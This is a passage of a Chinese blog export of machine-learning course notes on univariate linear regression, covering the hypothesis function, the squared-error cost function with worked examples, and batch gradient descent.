写这段代码 我们需要的<strong>关键项 是这里这个微分项</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561743_42538752_1539946555" alt="_1526561743_42538752_1539946555_1526561743_42538752.png"></p><ul><li>所以.我们需要弄清楚 这个偏导数项是什么 并结合这里的 代价函数$J$ 的定义 就是这样 一个求和项 代价函数就是 这个误差平方项 我这样做 只是 <strong>把定义好的代价函数 插入了这个微分式 再简化一下</strong> 这等于是 这一个求和项 $\theta_0+\theta_1x^{(i)}-y{(i)}$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561818_666946699_1539946612" alt="_1526561818_666946699_1539946612_1526561818_666946699.png"></p><ul><li>实际上我们需要 弄清楚这两个 偏导数项是什么 这两项分别是 j=0 和j=1的情况 因此<strong>我们要弄清楚 $\theta_0$和 $\theta_1$ 对应的 偏导数项是什么</strong> (<strong>将上面的式子平方化开再分别对$\theta_0$和 $\theta_1$求偏导</strong>)</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181227171343.png" alt></p><p>最终结果如下:</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561861_322362701_1539946651" alt="_1526561861_322362701_1539946651_1526561861_322362701.png"></p><ul><li>所以 偏导数项 从这个等式 到下面的等式 计算这些偏导数项需要一些多元微积分 如果你掌握了微积分 你可以随便自己推导这些 然后你检查你的微分 你实际上会得到我给出的答案 但如果你 不太熟悉微积分 别担心 你可以直接用这些 已经算出来的结果 你不需要掌握微积分 或者别的东西 来完成作业 你只需要会用梯度下降就可以</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561892_649652808_1539951959" alt="_1526561892_649652808_1539951959_1526561892_649652808.png"></p><ul><li>在定义这些以后 在我们算出 这些微分项以后 <strong>这些微分项 实际上就是代价函数J的斜率</strong> 现在可以将它们放回 我们的梯度下降算法 所以这就是<strong>专用于 线性回归的梯度下降 反复执行括号中的式子直到收敛</strong> <strong>$\theta_0$和$\theta_1$不断被更新 都是加上一个$-\frac{\alpha}{m}$ 乘上后面的求和项</strong> 所以这里这一项 所以这就是我们的<strong>线性回归算法</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561936_996217166_1539952078" alt="_1526561936_996217166_1539952078_1526561936_996217166.png"></p><ul><li>这一项就是<strong>关于$\theta_0$的偏导数</strong> 在上一张幻灯片中推出的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561956_1952955701_1539952499" alt="_1526561956_1952955701_1539952499_1526561956_1952955701.png"></p><ul><li>而第二项 这一项是刚刚的推导出的 <strong>关于$\theta_1$的 偏导数项</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561971_576823992_1539952519" alt="_1526561971_576823992_1539952519_1526561971_576823992.png"></p><ul><li>提醒一下 <strong>执行梯度下降时 有一个细节要注意 就是必须要 同时更新$\theta_0$和$\theta_1$</strong></li><li>所以 让我们来看看梯度下降是如何工作的 我们用梯度下降解决问题的 一个原因是 <strong>它更容易得到局部最优值</strong> 当我第一次解释梯度下降时 我展示过这幅图</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562028_517004246_1539952542" alt="_1526562028_517004246_1539952542_1526562028_517004246.png"></p><ul><li>在表面上 不断下降 并且我们知道了 根据你的初始化 你会得到不同的局部最优解 你知道.你可以结束了.在这里或这里。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562040_769496498_1539952555" alt="_1526562040_769496498_1539952555_1526562040_769496498.png"></p><ul><li>但是 <strong>事实证明 用于线性回归的 代价函数 总是这样一个 弓形的样子</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562056_1050624241_1539952593" alt="_1526562056_1050624241_1539952593_1526562056_1050624241.png"></p><ul><li>这个函数的专业术语是 这是一个<code>凸函数</code> 我不打算在这门课中 给出凸函数的定义 <code>凸函数(convex function)</code> 但不正式的说法是 它就是一个弓形的函数 因此 <strong>这个函数 没有任何局部最优解 只有一个全局最优解</strong> 并且<strong>无论什么时候 你对这种代价函数 使用线性回归 梯度下降法得到的结果 总是收敛到全局最优值</strong> 因为没有全局最优以外的其他局部最优点</li><li>现在 让我们来看看这个算法的执行过程 像往常一样 这是<code>假设函数</code>的图 还有<code>代价函数J</code>的图</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562070_1456917132_1539952610" alt="_1526562070_1456917132_1539952610_1526562070_1456917132.png"></p><ul><li>让我们来看看如何 初始化参数的值 <strong>通常来说 初始化参数为零 $\theta_0$和$\theta_1$都在零</strong> 但为了展示需要 在这个梯度下降的实现中 我<strong>把$\theta_0$初始化为-900 $\theta_1$初始化为-0.1</strong></li><li>这对应的假设$h(x)$ 就应该是下图左边 $h(x)=-900-0.1x$  代价函数$J(\theta_0,\theta_1)$对应的是下图右边</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562104_573736577_1539952665" alt="_1526562104_573736577_1539952665_1526562104_573736577.png"></p><ul><li>现在 如果我们进行一次梯度下降,从一点开始向左下方移动一小步,然后就得到了第二个点,可以看到,这第二点假设函数的线相对于第一点假设函数的线改变了一点点.</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562122_1863333386_1539952686" alt="_1526562122_1863333386_1539952686_1526562122_1863333386.png"></p><ul><li>然后就是不断的移动代价函数的点,梯度不断下降,假设函数越来越拟合数据,直到收敛到全局最小值.<strong>这个全局最小值对应的假设函数 给出了最拟合数据的解</strong> 这就是梯度下降法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562131_948800849_1539952693" alt="_1526562131_948800849_1539952693_1526562131_948800849.png"></p><ul><li>我们刚刚运行了一遍 并且最终得到了 房价数据的最好拟合结果 现在你可以用它来预测房价了 比如说 假如你有个朋友 他有一套房子 面积1250平方英尺(约116平米) 现在你可以通过这个数据 然后告诉他们 也许他的房子 可以卖到35万美元</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181227173815.png" alt></p><ul><li>最后 我想再给出 另一个名字 实际上 我们刚刚使用的算法  有时也称为<code>批量梯度下降(Batch Gradient Descent)</code>,指的是,在梯度下降的每一步中,我们都用到了所有的训练样本</li><li>在梯度下降中,在计算微分求导项时,我们需要进行求和计算,所以在<strong>每一个单独的梯度计算</strong>中,我们最终都要计算这样一个东西—这个项需要<strong>对所有m个训练样本求和</strong>.</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181227174120.png" alt></p><ul><li>有些同学之前 可能已经学过 高等线性代数 你应该知道 有一种计算代价函数J最小值的数值解法 不需要梯度下降这种迭代算法 在后面的课程中 我们也会谈到这个方法 它可以在不需要多步梯度下降的情况下 也能解出代价函数J的最小值 这是另一种称为<code>正规方程(normal equations)</code>的方法</li></ul><h3 id="小小的总结–Gradient-Descent-Fro-Linear-Regression"><a href="#小小的总结–Gradient-Descent-Fro-Linear-Regression" class="headerlink" title="小小的总结–Gradient Descent Fro Linear Regression"></a>小小的总结–Gradient Descent Fro Linear Regression</h3><ul><li>当具体应用于线性回归的情况时，可以导出梯度下降方程的新形式。 我们可以替换我们的代价函数和我们的假设函数，并将方程修改为:</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181227220519.png" alt></p><ul><li>其中$m$是训练集的大小,$\theta_0$和$\theta_1$是同时更新的  $x_i,y_i$是给定训练集（数据）的值。</li><li>请注意，我们已将$\theta_j$分成$\theta_0$和$\theta_1$ 对于$\theta_1$来说,最后还有乘以一个$x_i$ 以下是对$\frac{\alpha}{\alpha\theta_j}J(\theta)$的推导:</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181227220544.png" alt></p><ul><li>关键点是,我们从猜测假设函数开始,然后重复应用这些梯度下降方程，我们的假设将变得越来越准确。</li><li>因此，这只是原始代价函数J的梯度下降。该方法在每个步骤中用了整个训练集中的每个示例，并称为批量梯度下降。 需要注意的是，虽然梯度下降一般可以对局部最小值敏感，但我们在线性回归中提出的优化问题只有一个全局，而没有其他局部最优; 因此，梯度下降总是收敛（假设学习率α不是太大）到全局最小值。 实际上，J是凸二次函数。 下面是梯度下降的示例，因为它是为了最小化二次函数而运行的。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181227220555.png" alt></p><ul><li>上面显示的椭圆是二次函数的轮廓。 还示出了梯度下降所采用的轨迹，其在（48,30）处初始化。 图中的x（由直线连接）标记了梯度下降经历的θ的连续值，当它收敛到其最小值时。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单变量线性回归 </tag>
            
            <tag> Linear-Regression </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一章: Model and Cost Function</title>
      <link href="/2018/11/15/di-yi-zhang-model-and-cost-function/"/>
      <url>/2018/11/15/di-yi-zhang-model-and-cost-function/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章：-Model-and-Cost-Function"><a href="#第一章：-Model-and-Cost-Function" class="headerlink" title="第一章： Model and Cost Function"></a>第一章： Model and Cost Function</h1><h2 id="Model-Representation-模型表示"><a href="#Model-Representation-模型表示" class="headerlink" title="Model Representation:模型表示"></a>Model Representation:模型表示</h2><ul><li>我们的第一个学习算法是<code>线性回归算法</code>,了解监督学习过程完整的流程</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul><li>这个例子是预测住房价格的 我们要使用一个数据集 数据集包含俄勒冈州波特兰市的住房价格 在这里 我要根据不同房屋尺寸所售出的价格 画出我的数据集</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486337_877822591_1539943286" alt="_1526486337_877822591_1539943286_1526486337_877822591.png"></p><ul><li><p>比方说 我们来看这个数据集 你有一个朋友正想出售自己的房子 如果你朋友的房子是1250平方尺大小 你要告诉他们 这房子能卖多少钱 那么 你可以<strong>做的一件事就是 构建一个模型</strong> 也许是条直线 从这个数据模型上来看 也许你可以告诉你的朋友 他能以大约220000(美元)左右的价格 卖掉这个房子 那么这就是监督学习算法的一个例子</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486364_1763509138_1539943339" alt="_1526486364_1763509138_1539943339_1526486364_1763509138.png"></p></li><li><p>它被称作监督学习是因为对于每个数据来说 我们给出了 “<code>正确的答案</code>” 即告诉我们 根据我们的数据来说 房子实际的价格是多少 而且 更具体来说 这是一个<code>回归问题</code> <strong>回归一词指的是我们根据之前的数据预测出一个准确的输出值</strong> 对于这个例子就是<strong>价格</strong></p></li><li><p>同时 还有另一种最常见的监督学习方式 叫做<code>分类问题</code> <strong>当我们想要预测离散的输出值</strong> 例如 如果我们正在寻找 癌症肿瘤并想要确定 肿瘤是良性的还是恶性的 这就是0/1离散输出的问题</p></li><li><p>更进一步来说 <strong>在监督学习中我们有一个数据集 这个数据集被称</strong><code>训练集</code> 因此对于房价的例子 我们有一个训练集 包含不同的房屋价格 我们的任务就是从这个数据中学习预测房屋价格</p></li><li><p>现在我们给出这门课中经常使用的一些符号定义 我们要定义颇多符号 不过没关系 现在你记不住所有的符号也没关系 随着课程的进展 你会发现记住这些符号会很有用</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486393_1037348134_1539943381" alt="_1526486393_1037348134_1539943381_1526486393_1037348134.png"></p><ul><li><p><code>m</code>:<strong>来表示训练样本的数目</strong> 因此 在这个数据集中 如果表中有47行 那么我们就有47组训练样本 m就等于47</p></li><li><p><code>x</code><strong>来表示输入变量 往往也被称为特征量</strong> 这就是用x表示输入的特征</p></li><li><p><code>y</code><strong>来表示输出变量或者目标变量</strong> 也就是我的<strong>预测结果</strong> 那么这就是第二列</p></li><li><p>在这里使用<code>(x, y)</code>来表示一个<code>训练样本</code> 所以 在这个表格中的单独的一行对应于一个训练样本</p></li><li><p><code>表示某个训练样本</code> 我将使用<code>x上标(i)</code>与<code>y上标(i)</code>来表示 ,即<img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486414_196120304_1539943435" alt="_1526486414_196120304_1539943435_1526486414_196120304.png"></p></li><li><p>这就是一个监督学习算法的工作方式 我们可以看到这里有我们的训练集里房屋价格 我们把它喂给我们的学习算法 这就是学习算法的工作了 然后输出一个函数 按照惯例 通常表示为小写h <code>h代表hypothesis(假设)</code> <strong>h表示一个函数</strong> 输入是房屋尺寸大小 就像你朋友想出售的房屋 因此 h 根据输入的 x 值来得出 y 值 y值对应房子的价格 因此 <strong>h是一个从x到y的函数映射</strong></p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486441_1477225763_1539943461" alt="_1526486441_1477225763_1539943461_1526486441_1477225763.png"></p><ul><li>人们经常问我为什么这个函数被称作<code>假设(hypothesis)</code>你们中有些人可能知道<code>hypothesis</code>的意思 从字典或者其它什么方式可以查到 其实在机器学习中 这是一个在早期被用于机器学习的名称 它有点绕口 对这类函数来说 这可能不是一个很恰当的名字 对表示从房屋的大小到价格的函数映射 我认为这个词”hypothesis” 可能不是最好的名称 但是这是人们在机器学习中使用的标准术语 所以不用太纠结人们为什么这么叫它</li><li><strong>当设计学习算法的时候 我们接下来需要去思考的是 怎样得到这个假设h</strong></li><li>对于这一点在接下来的学习中 我将选择最初的使用规则 h代表hypothesis 我们将会这么写<img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486475_1276561196_1539943500" alt="_1526486475_1276561196_1539943500_1526486475_1276561196.png">为了方便 有时非书面形式也可以这么写 <code>hθ(x)</code> 我就写成<code>h(x)</code> 这是缩写方式 但一般来说我会保留这个下标θ 从这个图片中 所有这一切意味着我们要预测一个关于x的 线性函数 y 对吧? 所以这就是<strong>数据集和函数的作用:<code>用来预测</code></strong> 这里是y关于x的线性函数 <code>hθ(x)=θ0+θ1*x</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486492_526471029_1539943529" alt="_1526486492_526471029_1539943529_1526486492_526471029.png"></p><ul><li>那么为什么是一个线性函数呢? 有时候 我们会有更复杂的函数 也许是非线性函数 但是 由于线性方程是简单的形式 我们将先从线性方程的例子入手 当然 最终我们将会建立更复杂的模型 以及更复杂的学习算法 好吧 让我们也给这模型 起一个名字 这个模型被称为<code>线性回归(linear regression)模型</code> 另外 这实际上是关于单个变量的线性回归 这个变量就是x 根据x来预测所有的价格函数 同时 对于这种模型有另外一个名称 称作<code>单变量线性回归</code> 单变量是对一个变量的一种 特别的表述方式 总而言之 这就是线性回归 在接下来的视频中 我们将开始讨论如何去实现这种模型</li></ul><h3 id="小小的总结–Model-Representation模型表示"><a href="#小小的总结–Model-Representation模型表示" class="headerlink" title="小小的总结–Model Representation模型表示"></a>小小的总结–Model Representation模型表示</h3><ul><li>为了建立将来使用的符号，我们将使用 $x^i$ 来表示<code>“输入”变量</code>（在这个例子中是居住区域），也被称为<code>输入要素</code>，而 $y^i$  表示我们试图<code>预测的“输出”或目标变量</code>（价格）。一对 $(x^i,y^i)$ 被称为<code>训练样例</code>，我们将用来学习的<code>数据集----m</code>个训练样例的列表 $(x^i,y^i)$ ;i= 1，。 。 。 ， $m$ —- 被称为<code>训练集</code>。请注意，符号中的上标“（<code>i</code>）”仅仅是训练集的<code>索引</code>，与幂运算无关。我们也将用<code>X</code>来表示<code>输入值的空间</code>，用<code>Y</code>来表示<code>输出值的空间</code>。在这个例子中，X = Y =ℝ。</li><li>为了更形式化地描述监督学习问题，我们的目标是在给定训练集的情况下，去学习一个函数<code>h：X→Y</code>，使得<code>h（x）</code>是<code>y</code>的相应值的<code>“好”预测器</code>。由于历史原因，这个函数<code>h</code>被称为<code>假设</code>。从形象上看，这个过程是这样的：</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486547_637097161_1539943596" alt="_1526486547_637097161_1539943596_1526486547_637097161.png"></p><ul><li>当我们试图预测的目标变量是<code>连续的</code>，比如在我们的住房例子中，我们把学习问题称为<code>回归问题</code>。当y只能接受少量的<code>离散值</code>时（比如，如果考虑到居住面积，我们想要预测一个住宅是房子还是公寓），我们称之为<code>分类问题</code>。</li></ul><h2 id="Cost-Function-代价函数"><a href="#Cost-Function-代价函数" class="headerlink" title="Cost Function(代价函数)"></a>Cost Function(代价函数)</h2><ul><li><p>这里将定义<code>代价函数</code>的概念 这有助于我们 <code>弄清楚如何把最有可能的直线与我们的数据相拟合</code></p></li><li><p>在线性回归中我们有一个像这样的训练集 记住<code>M代表了训练样本的数量</code> 所以 比如说<code>M = 47</code> 而我们的假设函数 也就是用来进行预测的函数 是这样的线性函数形式:  $h_\theta(x)=\theta_0+\theta_1x$</p></li><li><p>接下来我们会引入一些术语 这些$\theta_0$和$\theta_1$ 这些θi我把它们称为<code>模型参数</code> 在这个视频中 我们要做的就是<strong>谈谈如何选择这两个参数值$\theta_0$和$\theta_1$</strong></p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486641_873314729_1539943679" alt="_1526486641_873314729_1539943679_1526486641_873314729.png"></p><ul><li>选择不同的参数$\theta_0$和$\theta_1$ 我们会得到不同的假设函数，如果$\theta_0$是1.5 $\theta_1$是0 那么假设函数会看起来是下图1这样， 因为你的假设函数是<code>h(x)=1.5+0*x</code> 是这样一个常数函数 恒等于1.5</li><li>如果$\theta_0$=0并且$\theta_1$=0.5 那么假设会看起来像这样 它会通过点(2,1) 这样你又得到了h(x) 或者hθ(x) 但是有时我们为了简洁会省略θ 因此 h(x)将等于0.5倍的x 就像下图2这样</li><li>最后 如果$\theta_0$=1并且$\theta_1$=0.5 我们最后得到的假设会看起来像下图3这样 让我们来看看 它应该通过点(2,2) 这是我的新的$h(x)$或者写作$h_\theta(x)$对吧？ 你还记得之前我们提到过$h_\theta(x)$的 但作为简写 我们通常只把它写作$h(x)$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486670_715550732_1539943705" alt="_1526486670_715550732_1539943705_1526486670_715550732.png"></p><ul><li>在线性回归中 我们有一个训练集 可能就像我在这里绘制的 <strong>我们要做的就是 得出θ0 θ1这两个参数的值 来让假设函数表示的直线 尽量地与这些数据点很好的拟合</strong> 也许就像这里的这条线一样</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486709_1177455732_1539943731" alt="_1526486709_1177455732_1539943731_1526486709_1177455732.png"></p><ul><li>那么我们如何得出θ0 θ1的值 来使它很好地拟合数据的呢？<strong>我们的想法是 我们要选择 能使 $h(x)$ 也就是 输入x时我们预测的值 最接近该样本对应的y值的参数$\theta_0$ $\theta_1$</strong> 所以 在我们的训练集中我们会得到一定数量的样本 我们知道x表示卖出哪所房子 并且知道这所房子的实际价格 所以 我们要尽量选择参数值 使得 在训练集中 给出训练集中的x值 我们能合理准确地预测y的值</li><li>让我们给出标准的定义 <code>在线性回归中 我们要解决的是一个最小化问题 所以我要写出关于θ0 θ1的最小化 而且 我希望这个式子极其小 是吧 我想要h(x)和y之间的差异要小 我要做的事情是尽量减少假设的输出与房子真实价格 之间的差的平方</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486729_441195085_1539943756" alt="_1526486729_441195085_1539943756_1526486729_441195085.png"></p><ul><li>接下来我会详细的阐述 别忘了 我用符号 $(x^i,y^i)$  代表第i个样本 所以我想要做的是<strong>对所有训练样本进行一个求和</strong> 对i=1到i=M的样本 将对假设进行预测得到的结果 此时的输入是第i号房子的面积 对吧 将第i号对应的预测结果 减去第i号房子的实际价格 所得的差的平方相加得到总和 而我希望尽量减小这个值 也就是<code>预测值和实际值的差的平方误差和</code> 或者说预测价格和 实际卖出价格的差的平方 我说了这里的 $m$ 指的是训练集的样本容量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486765_95100177_1539943786" alt="_1526486765_95100177_1539943786_1526486765_95100177.png"></p><ul><li>而为了让表达式的数学意义 变得容易理解一点 我们实际上考虑的是 这个数的<code>1/m</code> 因此我们要尝试尽量减少我们的平均误差 也就是<strong>尽量减少其1/2m</strong> 通常是这个数的一半 前面的这些只是为了使数学更直白一点 因此对这个求和值的二分之一求最小值 应该得出相同的$\theta_0$值和相同的$\theta_1$值来 请大家一定弄清楚这个道理 没问题吧？在这里hθ(x)的这种表达 这是我们的假设 它等于θ0加上θ1与x(i)的乘积 而这个表达 表示关于θ0和θ1的最小化过程 这意味着我们要找到θ0和θ1 的值来使这个表达式的值最小 这个表达式因θ0和θ1的变化而变化对吧？ 因此 简单地说 我们正在把这个问题变成 <code>找到能使 我的训练集中预测值和真实值的差的平方的和 的1/2M最小的θ0和θ1的值</code> 因此 这将是我的线性回归的整体目标函数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486784_343575659_1539943825" alt="_1526486784_343575659_1539943825_1526486784_343575659.png"></p><ul><li>为了使它更明确一点 我们要改写这个函数 按照惯例 我要定义一个<code>代价函数</code> 正如屏幕中所示 这里的这个公式 我们想要做的就是<code>关于θ0和θ1 对函数J(θ0,θ1)求最小值</code> 这就是我的代价函数 <code>代价函数也被称作平方误差函数</code> 有时也被称为 <code>平方误差代价函数</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486807_2121076322_1539943869" alt="_1526486807_2121076322_1539943869_1526486807_2121076322.png"></p><ul><li>事实上 我们之所以要求出 误差的平方和 是因为<code>误差平方代价函数 对于大多数问题 特别是回归问题 都是一个合理的选择</code> 还有其他的代价函数也能很好地发挥作用 但是平方误差代价函数可能是解决回归问题最常用的手段了 在后续课程中 我们还会谈论其他的代价函数 但我们刚刚讲的选择是对于大多数线性回归问题非常合理的 好吧 所以这是代价函数 到目前为止 我们已经 介绍了代价函数的数学定义 也许这个函数<code>J(θ0,θ1)</code>有点抽象 可能你仍然不知道它的内涵 在接下来的几个视频里 我们要更进一步解释 代价函数J的工作原理 并尝试更直观地解释它在计算什么 以及我们使用它的目的</li></ul><h3 id="小小的总结-Cost-Function-代价函数"><a href="#小小的总结-Cost-Function-代价函数" class="headerlink" title="小小的总结-Cost Function(代价函数)"></a>小小的总结-Cost Function(代价函数)</h3><ul><li>我们可以<code>通过使用代价函数来衡量我们的假设函数的准确性</code>。 这个假设的所有结果的平均差异（实际上是一个平均值的更漂亮的版本）与来自x的输入和实际输出y的输入。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486842_1687157529_1539943891" alt="_1526486842_1687157529_1539943891_1526486842_1687157529.png"></p><ul><li>To break it apart，结果是$\frac{1}{2}\bar{x}$，其中$\bar{x}$是 $h_\theta(x_i)-y_i$  平方的平均值，或<code>预测值与实际值之间的差值</code>。</li><li>该函数被称为“<code>平方误差函数(Squared error function)</code>”或“<code>均方误差(Mean squared error)</code>”。 <strong>由于平方函数的导数项将抵消该项，平均值被减半以作为计算梯度下降的便利</strong>。 以下图片总结了成本函数的作用：</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486916_672453545_1539944069" alt="_1526486916_672453545_1539944069_1526486916_672453545.png"></p><h2 id="Cost-Function-Intuition-I"><a href="#Cost-Function-Intuition-I" class="headerlink" title="Cost Function - Intuition I"></a>Cost Function - Intuition I</h2><ul><li>在上一个视频中 我们给了代价函数一个数学上的定义 在这个视频里 让我们通过一些例子来获取一些直观的感受 看看代价函数到底是在干什么 回顾一下 这是我们上次所讲过的内容 我们想找一条直线来拟合我们的数据 所以我们用 $\theta_0$  $\theta_1$等参数 得到了这个假设 而且通过选择不同的参数 我们会得到不同的直线拟合 所以拟合出的数据就像这样 然后我们还有一个代价函数 这就是我们的优化目标</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486985_1746525095_1539944106" alt="_1526486985_1746525095_1539944106_1526486985_1746525095.png"></p><ul><li>在这个视频里 为了更好地 将代价函数可视化 我将使用一个简化的假设函数 就是下面这个函数 然后我将会用这个简化的假设 也就是 <code>θ1*x</code> 我们可以将这个函数看成是 把 <code>θ0 设为0</code> 所以我只有一个参数 也就是 <code>θ1</code> 代价函数看起来与之前的很像 唯一的区别是现在 h(x) 等于 <code>θ1*x</code> 只有一个参数 θ1 所以我的 优化目标是将 <code>J(θ1)</code>最小化 用图形来表示就是 如果 <code>θ0</code> 等于零 也就意味这我们选择的假设函数 会经过原点 也就是经过坐标 (0,0) 通过利用简化的假设得到的代价函数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487023_1285650805_1539944167" alt="_1526487023_1285650805_1539944167_1526487023_1285650805.png"></p><ul><li>我们可以试着更好地理解 代价函数这个概念 我们要理解的是这两个重要的函数 第一个是假设函数 第二个是代价函数 注意这个假设函数 h(x) 对于一个固定的 $\theta_1$ ，h(x)是关于 x 的函数 所以这个假设函数就是一个关于 x 这个房子大小的函数 与此不同的是 代价函数 J 是一个关于参数 $\theta_1$ 的函数 而 $\theta_1$ 控制着这条直线的斜率</li><li>现在我们把这些函数都画出来 试着更好地理解它们 我们从假设函数开始 比如说这里是我的<strong>训练样本 它包含了三个点 (1,1) (2,2) 和 (3,3)</strong> 现在我们随便选择一个值 $\theta_1$ ，这里<strong>选择 θ1 等于1</strong> ，选择 $\theta_1$=1之后， 那么我的假设函数看起来就会像是这条直线 我将要指出的是 <strong>当我想要描绘出我的假设函数时， 我的横轴被标定为X轴 X轴是表示房子大小的量 现在暂时把 $\theta_1$ 定为1 我想要做的就是 算出在 $\theta_1$ 等于 1 的时候 $J(\theta_1)$ 等于多少</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487060_1394238758_1539944241" alt="_1526487060_1394238758_1539944241_1526487060_1394238758.png"></p><ul><li>所以我们 按照这个思路来计算代价函数的大小 和之前一样 代价函数定义如下 是吧 对这个误差平方项进行求和 这就等于 这样一个形式 简化以后就等于 三个0的平方和 当然还是0</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487093_1136770439_1539944268" alt="_1526487093_1136770439_1539944268_1526487093_1136770439.png"></p><ul><li>现在 在代价函数里 我们发现所有这些值都等于0 因为<strong>对于我所选定的这三个训练样本 ( 1 ,1 ) (2,2) 和 (3,3) 如果 $\theta_1$ 等于 1 那么 $h(x^{(i)})$ 就会正好等于 $y^{(i)}$ 所以 <code>h(x) - y</code> 所有的这些值都会等于零</strong> 这也就是为什么<strong>J(1) 等于零</strong></li><li>所以 我们现在知道了 J(1) 是0 让我把这个画出来 我将要在屏幕右边画出我的代价函数 J 要注意的是 因为我的代价函数是关于参数 $\theta_1$ 的函数 当我描绘我的<strong>代价函数时 X轴就是 θ1</strong> 现在我有 <strong>J(1) 等于零</strong> 让我们继续把函数画出来 结果我们会得到这样一个点</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487138_631239648_1539944315" alt="_1526487138_631239648_1539944315_1526487138_631239648.png"></p><ul><li>现在我们来看其它一些样本 $\theta_1$ 可以被设定为 某个范围内各种可能的取值 所以 $\theta_1$ 可以取负数 ,0 或者正数 所以如果 <code>θ1 等于0.5</code>会发生什么呢 继续把它画出来 现在要把 $\theta_1$ 设为0.5 在这个条件下 我的假设函数看起来就是这样 这条线的斜率等于0.5 现在让我们计算 $J(0.5)$ 所以这将会等于1除以2m 乘以那一块 其实我们不难发现后面的求和 就是这条线段的高度的平方 加上这条线段高度的平方 再加上这条线段高度的平方 三者求和 对吗？ 就是 $y^{(i)}$ 与预测值 $h(x^{(i)})$ 的差 对吗 所以第一个样本将会是0.5减去1的平方 因为我的假设函数预测的值是0.5 而实际值则是1 第二个样本 我得到的是1减去2的平方 因为我的假设函数预测的值是1 但是实际房价是2 最后 加上 1.5减去3的平方 那么这就等于1除以2乘以3 因为训练样本有三个点所以 $m$ 等于3 对吧 然后乘以括号里的内容 简化后就是3.5 所以这就等于3.5除以6 也就约等于0.58</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487160_1122698449_1539944357" alt="_1526487160_1122698449_1539944357_1526487160_1122698449.png"></p><ul><li>让我们把这个点画出来 不好意思 有一个计算错误 <code>这实际上该是0.58</code> 所以我们把点画出来 大约会是在这里 对吗</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487174_936519972_1539944425" alt="_1526487174_936519972_1539944425_1526487174_936519972.png"></p><ul><li>现在 让我们再多做一个点 让我们试试 $\theta_1$ 等于0, $J(0)$ 会等于多少呢 如果 $\theta_1$等于0 那么 h(x) 就会等于一条水平的线 对了 就会像这样是水平的 所以 测出这些误差 我们将会得到 J(0) 等于 1除以 2m 乘以1的平方 加上2的平方 加上3的平方 也就是 1除以6乘以14 也就是2.3左右 所以让我们接着把这个点也画出来 所以这个点最后是2.3</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487181_1047071511_1539944461" alt="_1526487181_1047071511_1539944461_1526487181_1047071511.png"></p><ul><li>当然我们可以接着设定  $\theta_1$ 等于别的值 进行计算 你也可以把  $\theta_1$ 设定成一个负数 所以如果  $\theta_1$ 是负数  打个比方说 －0.5 乘以x 然后  $\theta_1$ 就是 -0.5 那么这将会 对应着一个斜率为-0.5的假设函数 而且你可以 继续计算这些误差 结果你会发现 对于0.5 结果会是非常大的误差 